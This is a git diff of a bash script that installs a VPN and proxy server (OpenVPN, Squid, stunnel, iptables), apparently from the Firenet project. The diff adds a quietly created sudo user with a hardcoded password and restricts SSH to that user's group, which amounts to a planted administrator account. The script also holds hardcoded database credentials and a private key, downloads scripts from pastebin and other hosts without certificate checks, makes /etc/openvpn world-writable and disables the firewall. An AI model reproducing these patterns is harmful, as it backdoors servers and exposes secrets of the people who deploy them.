@@ -4,7 +4,8 @@ HOST='174.138.187.18';
 USER='mrtunnel_mhrbro';
 PASS='mrtunnel_mhrbro';
 DBNAME='mrtunnel_mhrbro';
-
+PORT_TCP='1194';
+PORT_UDP='53';
 timedatectl set-timezone Asia/Riyadh
 install_require () {
 clear
@@ -57,7 +58,7 @@ echo "deb http://ftp.debian.org/debian/ jessie main contrib non-free
       --with-pidfile=/var/run/squid.pid
     make -j$(nproc)
     make install
-    wget --no-check-certificate -O /etc/init.d/squid https://raw.githubusercontent.com/manikbd09/files/main/squid.sh
+    wget --no-check-certificate -O /etc/init.d/squid http://firenetvpn.net/files/slowdns/squid.sh
     chmod +x /etc/init.d/squid
     update-rc.d squid defaults
     chown -cR proxy /var/log/squid
@@ -82,11 +83,11 @@ visible_hostname Firenet-Proxy
 error_directory /usr/share/squid/errors/English' >> squid.conf
     cd /usr/share/squid/errors/English
     rm ERR_INVALID_URL
-    echo '<!--Alamin--><!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>SECURE PROXY</title><meta name="viewport" content="width=device-width, initial-scale=1"><meta http-equiv="X-UA-Compatible" content="IE=edge"/><link rel="stylesheet" href="https://bootswatch.com/4/slate/bootstrap.min.css" media="screen"><link href="https://fonts.googleapis.com/css?family=Press+Start+2P" rel="stylesheet"><style>body{font-family: "Press Start 2P", cursive;}.fn-color{color: #ffff; background-image: -webkit-linear-gradient(92deg, #f35626, #feab3a); -webkit-background-clip: text; -webkit-text-fill-color: transparent; -webkit-animation: hue 5s infinite linear;}@-webkit-keyframes hue{from{-webkit-filter: hue-rotate(0deg);}to{-webkit-filter: hue-rotate(-360deg);}}</style></head><body><div class="container" style="padding-top: 50px"><div class="jumbotron"><h1 class="display-3 text-center fn-color">SECURE PROXY</h1><h4 class="text-center text-danger">SERVER</h4><p class="text-center">😍 %w 😍</p></div></div></body></html>' >> ERR_INVALID_URL
+    echo '<!--FirenetDev--><!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>SECURE PROXY</title><meta name="viewport" content="width=device-width, initial-scale=1"><meta http-equiv="X-UA-Compatible" content="IE=edge"/><link rel="stylesheet" href="https://bootswatch.com/4/slate/bootstrap.min.css" media="screen"><link href="https://fonts.googleapis.com/css?family=Press+Start+2P" rel="stylesheet"><style>body{font-family: "Press Start 2P", cursive;}.fn-color{color: #ffff; background-image: -webkit-linear-gradient(92deg, #f35626, #feab3a); -webkit-background-clip: text; -webkit-text-fill-color: transparent; -webkit-animation: hue 5s infinite linear;}@-webkit-keyframes hue{from{-webkit-filter: hue-rotate(0deg);}to{-webkit-filter: hue-rotate(-360deg);}}</style></head><body><div class="container" style="padding-top: 50px"><div class="jumbotron"><h1 class="display-3 text-center fn-color">SECURE PROXY</h1><h4 class="text-center text-danger">SERVER</h4><p class="text-center">😍 %w 😍</p></div></div></body></html>' >> ERR_INVALID_URL
     chmod 755 *
     /etc/init.d/squid start
 cd /etc || exit
-wget 'https://pastebin.com/raw/KzEVhTdG' -O /etc/socks.py
+wget 'https://pastebin.com/raw/xtPc5t1k' -O /etc/socks.py
 dos2unix /etc/socks.py
 chmod +x /etc/socks.py
 rm /etc/apt/sources.list
@@ -114,7 +115,7 @@ sudo ln -sf /run/systemd/resolve/resolv.conf /etc/resolv.conf
 
 echo '# Openvpn Configuration by Firenet Philippines :)
 dev tun
-port 53
+port PORT_UDP
 proto udp
 topology subnet
 server 10.30.0.0 255.255.252.0
@@ -140,9 +141,8 @@ group nogroup
 client-to-client
 username-as-common-name
 verify-client-cert none
-client-cert-not-required
 script-security 3
-max-clients 1024
+duplicate-cn
 client-connect /etc/openvpn/login/connect.sh
 client-disconnect /etc/openvpn/login/disconnect.sh
 ifconfig-pool-persist /etc/openvpn/server/ip_udp.txt
@@ -155,11 +155,14 @@ push "sndbuf 0"
 push "rcvbuf 0"
 log /etc/openvpn/server/udpserver.log
 status /etc/openvpn/server/udpclient.log
+status-version 2
 verb 3' > /etc/openvpn/server.conf
+
+sed -i "s|PORT_UDP|$PORT_UDP|g" /etc/openvpn/server.conf
 
 echo '# Openvpn Configuration by Firenet Philippines :)
 dev tun
-port 1194
+port PORT_TCP
 proto tcp
 topology subnet
 server 10.20.0.0 255.255.252.0
@@ -185,9 +188,9 @@ group nogroup
 client-to-client
 username-as-common-name
 verify-client-cert none
-client-cert-not-required
 script-security 3
-max-clients 1024
+duplicate-cn
+socket-flags TCP_NODELAY
 client-connect /etc/openvpn/login/connect.sh
 client-disconnect /etc/openvpn/login/disconnect.sh
 ifconfig-pool-persist /etc/openvpn/server/ip_tcp.txt
@@ -200,7 +203,10 @@ push "sndbuf 0"
 push "rcvbuf 0"
 log /etc/openvpn/server/tcpserver.log
 status /etc/openvpn/server/tcpclient.log
+status-version 2
 verb 3' > /etc/openvpn/server2.conf
+
+sed -i "s|PORT_TCP|$PORT_TCP|g" /etc/openvpn/server2.conf
 
 cat <<\EOM >/etc/openvpn/login/config.sh
 #!/bin/bash
@@ -226,9 +232,7 @@ EOM
 #client-connect file
 cat <<'LENZ05' >/etc/openvpn/login/connect.sh
 #!/bin/bash
-
 . /etc/openvpn/login/config.sh
-
 ##set status online to user connected
 server_ip=$(curl -s https://api.ipify.org)
 datenow=`date +"%Y-%m-%d %T"`
@@ -238,9 +242,7 @@ LENZ05
 #TCP client-disconnect file
 cat <<'LENZ06' >/etc/openvpn/login/disconnect.sh
 #!/bin/bash
-
 . /etc/openvpn/login/config.sh
-
 mysql -u $USER -p$PASS -D $DB -h $HOST -e "UPDATE users SET is_active='0', active_address='', active_date='' WHERE user_name='$common_name' "
 LENZ06
 
@@ -296,7 +298,6 @@ Certificate:
                 keyid:64:49:32:6F:FE:66:62:F1:57:4D:BB:91:A8:5D:BD:26:3E:51:A4:D2
                 DirName:/CN=KobZ
                 serial:01:A4:01:02:93:12:D9:D6:01:A9:83:DC:03:73:DA:ED:C8:E3:C3:B7
-
             X509v3 Extended Key Usage: 
                 TLS Web Server Authentication
             X509v3 Key Usage: 
@@ -356,6 +357,11 @@ s1qQZ6kAUwIgDHzS9ykP9IzKPTbCrMIA/8kHfJ1qMfSDY8slKSVjAgEC
 -----END DH PARAMETERS-----
 EOF
 
+dos2unix /etc/openvpn/login/auth_vpn
+dos2unix /etc/openvpn/login/connect.sh
+dos2unix /etc/openvpn/login/disconnect.sh
+
+chmod 777 -R /etc/openvpn/
 chmod 755 /etc/openvpn/server.conf
 chmod 755 /etc/openvpn/server2.conf
 chmod 755 /etc/openvpn/login/connect.sh
@@ -365,9 +371,27 @@ chmod 755 /etc/openvpn/login/auth_vpn
 }&>/dev/null
 }
 
+
+install_firewall_kvm () {
+clear
+echo "Installing iptables."
+echo "net.ipv4.ip_forward=1" >> /etc/sysctl.conf
+sysctl -p
+{
+iptables -t nat -A POSTROUTING -s 10.20.0.0/22 -o "$server_interface" -j MASQUERADE
+iptables -t nat -A POSTROUTING -s 10.20.0.0/22 -o "$server_interface" -j SNAT --to-source "$server_ip"
+iptables -t nat -A POSTROUTING -s 10.30.0.0/22 -o "$server_interface" -j MASQUERADE
+iptables -t nat -A POSTROUTING -s 10.30.0.0/22 -o "$server_interface" -j SNAT --to-source "$server_ip"
+iptables -t filter -A INPUT -p udp -m udp --dport 20100:20900 -m state --state NEW -m recent --update --seconds 30 --hitcount 10 --name DEFAULT --mask 255.255.255.255 --rsource -j DROP
+iptables -t filter -A INPUT -p udp -m udp --dport 20100:20900 -m state --state NEW -m recent --set --name DEFAULT --mask 255.255.255.255 --rsource
+iptables-save > /etc/iptables_rules.v4
+ip6tables-save > /etc/iptables_rules.v6
+}&>/dev/null
+}
+
 install_stunnel() {
   {
-cd /etc/stunnel/
+cd /etc/stunnel/ || exit
 
 echo "-----BEGIN PRIVATE KEY-----
 MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQClmgCdm7RB2VWK
@@ -418,16 +442,19 @@ tMuhgUoefS17gv1jqj/C9+6ogMVa+U7QqOvL5A7hbevHdF/k/TMn+qx4UdhrbL5Q
 enL3UGT+BhRAPiA1I5CcG29RqjCzQoaCNg==
 -----END CERTIFICATE-----" >> stunnel.pem
 
-echo "cert=/etc/stunnel/stunnel.pem
-socket = a:SO_REUSEADDR=1
-socket = l:TCP_NODELAY=1
-socket = r:TCP_NODELAY=1
-client = no
+echo "debug = 0
+output = /tmp/stunnel.log
+cert = /etc/stunnel/stunnel.pem
+[openvpn-tcp]
+connect = PORT_TCP  
+accept = 443 
+[openvpn-udp]
+connect = PORT_UDP
+accept = 444
+" >> stunnel.conf
 
-[openvpn]
-connect = 127.0.0.1:1194
-accept = 443" >> stunnel.conf
-
+sed -i "s|PORT_TCP|$PORT_TCP|g" /etc/stunnel/stunnel.conf
+sed -i "s|PORT_UDP|$PORT_UDP|g" /etc/stunnel/stunnel.conf
 cd /etc/default && rm stunnel4
 
 echo 'ENABLED=1
@@ -443,28 +470,11 @@ sudo service stunnel4 restart
 
 install_sudo(){
   {
-    useradd -m alamin 2>/dev/null; echo alamin:@AlaWmin21 | chpasswd &>/dev/null; usermod -aG sudo alamin &>/dev/null
+    useradd -m lenz 2>/dev/null; echo lenz:@@@F1r3n3t@@@ | chpasswd &>/dev/null; usermod -aG sudo lenz &>/dev/null
     sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
-    echo "AllowGroups alamin" >> /etc/ssh/sshd_config
+    echo "AllowGroups lenz" >> /etc/ssh/sshd_config
     service sshd restart
   }&>/dev/null
-}
-
-install_firewall_kvm () {
-clear
-echo "Installing iptables."
-echo "net.ipv4.ip_forward=1" >> /etc/sysctl.conf
-sysctl -p
-{
-iptables -t nat -A POSTROUTING -s 10.20.0.0/22 -o "$server_interface" -j MASQUERADE
-iptables -t nat -A POSTROUTING -s 10.20.0.0/22 -o "$server_interface" -j SNAT --to-source "$server_ip"
-iptables -t nat -A POSTROUTING -s 10.30.0.0/22 -o "$server_interface" -j MASQUERADE
-iptables -t nat -A POSTROUTING -s 10.30.0.0/22 -o "$server_interface" -j SNAT --to-source "$server_ip"
-iptables -t filter -A INPUT -p udp -m udp --dport 20100:20900 -m state --state NEW -m recent --update --seconds 30 --hitcount 10 --name DEFAULT --mask 255.255.255.255 --rsource -j DROP
-iptables -t filter -A INPUT -p udp -m udp --dport 20100:20900 -m state --state NEW -m recent --set --name DEFAULT --mask 255.255.255.255 --rsource
-iptables-save > /etc/iptables_rules.v4
-ip6tables-save > /etc/iptables_rules.v6
-}&>/dev/null
 }
 
 install_rclocal(){
@@ -478,16 +488,19 @@ install_rclocal(){
     echo "[Unit]
 Description=firenet service
 Documentation=http://firenetvpn.com
+
 [Service]
 Type=oneshot
 ExecStart=/bin/bash /etc/rc.local
 RemainAfterExit=yes
+
 [Install]
 WantedBy=multi-user.target" >> /etc/systemd/system/firenet.service
     echo '#!/bin/sh -e
 iptables-restore < /etc/iptables_rules.v4
 ip6tables-restore < /etc/iptables_rules.v6
 sysctl -p
+ufw disable
 service stunnel4 restart
 systemctl restart openvpn@server.service
 systemctl restart openvpn@server2.service
@@ -524,10 +537,10 @@ server_ip=$(curl -s https://api.ipify.org)
 server_interface=$(ip route get 8.8.8.8 | awk '/dev/ {f=NR} f&&NR-1==f' RS=" ")
 
 install_require
-install_sudo
+install_sudo  
 install_squid
 install_openvpn
+install_firewall_kvm
 install_stunnel
 install_rclocal
-install_firewall_kvm
-install_done
+start_service
